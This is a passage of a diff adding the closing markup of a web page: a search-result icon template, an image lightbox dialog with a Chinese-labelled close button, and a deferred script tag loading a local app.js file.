+        <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
+      </div>
+    </dialog>
+    
+    <dialog class="image-lightbox" data-image-lightbox>
+      <button class="icon-button lightbox-close" type="button" data-lightbox-close aria-label="关闭图片预览"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+      <img data-lightbox-image alt="">
+      <p data-lightbox-caption></p>
+    </dialog>
+    <script src="/assets/app.js" defer></script>
+  </body>
+</html>
